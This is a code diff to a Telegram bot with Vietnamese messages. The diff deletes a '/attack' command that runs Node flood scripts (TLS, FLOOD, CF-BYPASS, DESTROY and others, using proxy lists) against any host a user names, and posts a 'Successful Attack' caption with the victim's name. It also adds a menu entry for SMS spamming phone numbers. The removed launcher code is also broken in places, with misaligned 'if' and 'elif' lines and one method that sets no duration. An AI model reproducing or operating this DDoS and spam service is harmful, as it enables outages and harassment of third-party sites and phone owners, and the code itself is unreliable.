@@ -101,7 +101,7 @@ def diggory(message):
     diggory_chat = f'''
 ┌──────────⭓VIP @Louisvinh
 │» 🔔 Hello: @{username}
-│»  🐸 𝐵𝑜𝑡 𝐵𝑦 顶级开发商│ ᴍʀ 𝐕𝐋𝐒\n│»🛌 /admin : 𝐼𝑛𝑓𝑜 𝐴𝑑𝑚𝑖𝑛.\n│»👾 /attack : Website Request Attack\n🍉 /methods : See List of Methods\n│»🥶 /tiktok : Download video tik\n│»💡 /ask : GPT AI Bot.\n│»🤖/time : check time\n│»🖥️/id : Scan Id\n│»🌐 Telegram : @Lousivinh
+│»  🐸 𝐵𝑜𝑡 𝐵𝑦 顶级开发商│ ᴍʀ 𝐕𝐋𝐒\n│»🛌 /admin : 𝐼𝑛𝑓𝑜 𝐴𝑑𝑚𝑖𝑛.\n🍉 /sms : Spam SDT\n│»🥶 /tiktok : Download video tik\n│»💡 /ask : GPT AI Bot.\n│»🤖/time : check time\n│»🖥️/id : Scan Id\n│»🌐 Telegram : @Lousivinh
 └─────────────────────
     '''
     sent_message = bot.send_message(message.chat.id, diggory_chat)
@@ -361,112 +361,6 @@ def filter_message(message):
             break
    
     
-
-def run_attack(command, duration, message):
-    cmd_process = subprocess.Popen(command)
-    start_time = time.time()
-    
-    while cmd_process.poll() is None:
-        # Check CPU usage and terminate if it's too high for 10 seconds
-        if psutil.cpu_percent(interval=1) >= 1:
-            time_passed = time.time() - start_time
-            if time_passed >= 90:
-                cmd_process.terminate()
-                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
-                return
-        # Check if the attack duration has been reached
-        if time.time() - start_time >= duration:
-            cmd_process.terminate()
-            cmd_process.wait()
-            return
-
-@bot.message_handler(commands=['attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    if len(message.text.split()) < 3:
-        bot.reply_to(message, 'Please enter the correct syntax.\nFor example: `/attack` + [method] + [host]')
-        return
-
-    username = message.from_user.username
-
-    current_time = time.time()
-    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 10:
-        remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"@{username} Please wait {remaining_time} seconds before using the command again `/attack`.")
-        return
-    
-    args = message.text.split()
-    method = args[1].upper()
-    host = args[2]
-
-    if method in ['TLS', 'FLOOD'] and len(args) < 4:
-        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
-        return
-
-    if method in ['TLS', 'FLOOD']:
-        port = args[3]
-    else:
-        port = None
-
-    blocked_domains = [".edu.vn", ".gov.vn", "liem.com"]   
-    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
-        for blocked_domain in blocked_domains:
-            if blocked_domain in host:
-                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
-                return
-if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'FLOOD', 'BROWSER']:
-        # Update the command and duration based on the selected method
-        if method == 'TLS':
-            command = ["node", "TLS.js", host, "90", "64", "5"]
-            duration = 90
-        elif method == 'GOD':
-            command = ["node", "GOD.js", host, "90", "64", "10"]
-            duration = 45
-        elif method == 'DESTROY':
-            command = ["node", "DESTROY.js", host,
-                       "90", "64", "2", "proxy.txt"]
-            duration = 90
-        elif method == 'CF-BYPASS':
-            command = ["node", "CF-BYPASS.js",
-                       host, "90", "64", "1", "proxy.txt"]
-         elif method == 'BYPASS':
-            command = ["node", "BYPASS.js",
-                       host, "90", "64", "1", "proxy.txt"]
-        elif method == 'BROWSER':
-            command = ["node", "BROWSER.js", host, "90", "50", "proxy.txt", "128", "90"]
-            duration = 90
-        elif method == 'FLOOD':
-            command = ["node", "FLOOD.js", host, "90", "120", "50", "proxy.txt"]
-            duration = 90
-
-        cooldown_dict[username] = {'attack': current_time}
-
-        attack_thread = threading.Thread(
-            target=run_attack, args=(command, duration, message))
-        attack_thread.start()
-        video_url = "https://files.catbox.moe/pk5y20.mp4"  # Replace this with the actual video URL      
-        message_text =f'\n   Successful Attack \n\n\n➣ User👤: @{username} \n➣ Victim⚔️: {host} \n➣ Methods📁: {method} \n➣ Time⏰: [ {duration}s ]\n\n'
-        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
-        
-    else:
-        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')
-
-
-
-@bot.message_handler(commands=['methods'])
-def methods(message):
-    help_text = '''
-𝐖𝐡𝐢𝐬 𝐌𝐞𝐭𝐡𝐨𝐝𝐬 𝐋𝐚𝐲𝐞𝐫 𝟕
-𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : /attack + [𝒉𝒐𝒔𝒕] + [𝒑𝒐𝒓𝒕] + [𝒕𝒊𝒎𝒆] + [𝒎𝒆𝒕𝒉𝒐𝒅𝒔]
- - DESTROY
- - FLOOD
- - BYPASS
- - CF-BYPASS
- - TLS
- - GOD
- - BROWSER
-'''
-    bot.reply_to(message, help_text)
 
 
 
